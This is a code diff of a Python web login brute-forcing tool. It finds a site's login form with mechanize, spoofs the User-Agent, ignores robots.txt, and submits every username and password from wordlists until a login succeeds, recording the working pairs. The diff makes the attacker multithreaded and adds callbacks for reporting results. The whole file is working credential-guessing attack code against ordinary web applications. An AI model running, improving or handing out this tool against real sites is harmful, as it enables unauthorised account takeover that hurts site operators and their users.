@@ -1,4 +1,5 @@
 import actions, utils, sys, mechanize
+import threading, itertools
 
 ##################################################################
 #
@@ -14,8 +15,8 @@ import actions, utils, sys, mechanize
 #
 ##################################################################
 
-class BruteForcing(object):
-	def __init__(self, optURL, optUsrList, optPassList):
+class BruteForcing(threading.Thread):
+	def __init__(self, optURL, optUsrList, optPassList, pid):
 		###############################################################
 		#
 		#	@Ic3W4ll
@@ -32,6 +33,7 @@ class BruteForcing(object):
 		#
 		################################################################
 
+		threading.Thread.__init__(self)
 		self.varTargetURL = optURL
 		self.varUserAgent = actions.action_getUserAgent()
 		self.frmLoginID = 0
@@ -39,9 +41,19 @@ class BruteForcing(object):
 		self.frmPassField = ''
 		self.lstUsername = optUsrList
 		self.lstPassword = optPassList
-		self.szPassword = actions.subaction_countListSize(self.lstPassword.readlines())
+		self.szPassword = actions.subaction_countListSize(self.lstPassword)
 		self.fndData = []
-		self.actTestConnection()
+		self.isPassFound = False
+		self.id = pid
+		#self.batchSize = batchSize
+
+		#self.actTestConnection()
+
+	def setOnEachBruteCallback(self, callback):
+		self.onEachBruteDone = callback
+
+	def setCallback(self, callback):
+		self.callback = callback
 
 	def actTestConnection(self):
 
@@ -50,23 +62,21 @@ class BruteForcing(object):
 		process.addheaders = [('User-Agent', self.varUserAgent)]
 		process.set_handle_robots(False)
 
-		#	Connecting to Target
-		utils.printf("Testing connection....")
-
 		try:
 			process.open(self.varTargetURL)
-			utils.printf("Connected to URL. Gathering login form information...\n", "good")
+			#utils.printf("Connected to URL. Gathering login form information...\n", "good")
 			self.frmLoginID, self.frmUserField, self.frmPassField = actions.action_getFormInformation(process.forms())
-			utils.printf("Found login form", "good")
+			#utils.printf("Found login form", "good")
 			process.close()
+			return True
 
 		except TypeError:
 			utils.printf("Can not find any login form in %s" %(self.varTargetURL), "bad")
-			sys.exit(1)
+			return False
 
 		except mechanize.HTTPError as error:
 			utils.printf(error, "bad")
-			sys.exit(1)
+			return False
 
 	def actGetResult(self):
 		return self.fndData
@@ -79,8 +89,8 @@ class BruteForcing(object):
 			browserObject.form[self.frmPassField] = tryPassword
 
 			#	Print progress bar
-			utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassword, '=' * 6, count, self.szPassword))
-
+			# utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassword, '=' * 6, count, self.szPassword))
+			# utils.prints("thread: #%s testing: %s : %s" % (self.id, tryUsername, tryPassword))
 			#	Send request
 			browserObject.submit()
 
@@ -91,7 +101,8 @@ class BruteForcing(object):
 			#		add login information to fndData, return True
 
 			if not actions.action_getFormInformation(browserObject.forms()):
-				utils.printf("Found: %s:%s" %(tryUsername, tryPassword), "good")
+				# utils.printf("Found: %s:%s" %(tryUsername, tryPassword), "good")
+				self.isPassFound = True
 				self.fndData.append([tryUsername, tryPassword])
 				return True
 			return False
@@ -103,17 +114,9 @@ class BruteForcing(object):
 	def run(self):
 		#Start brute forcing
 		###############################
-		#	Testing, does not need
-		try:
-			self.lstUsername.seek(0)
-		except:
-			pass
-
 		for idxUsername in self.lstUsername:
-
 			count = 0
 			idxUsername = idxUsername.replace('\n', '')
-
 			proc = mechanize.Browser()
 			proc.addheaders = [('User-Agent', self.varUserAgent)]
 			proc.set_handle_robots(False)
@@ -123,18 +126,15 @@ class BruteForcing(object):
 			#	Read password file from start point
 			#
 			#######################################
-			try:
-				self.lstPassword.seek(0)
-			except:
-				pass
-
+			
 			for idxPasswd in self.lstPassword:
 				idxPasswd = idxPasswd.replace('\n', '')
 
 				count += 1
 				if self.actTryTargetLogin(proc, idxUsername, idxPasswd, count):
 					break
-
-			if count == self.szPassword:
-				utils.printf("%s: No match found." %(idxUsername), "bad")
+				else:
+					self.onEachBruteDone()
 			proc.close()
+			self.callback(self.id, self.actGetResult())
+		
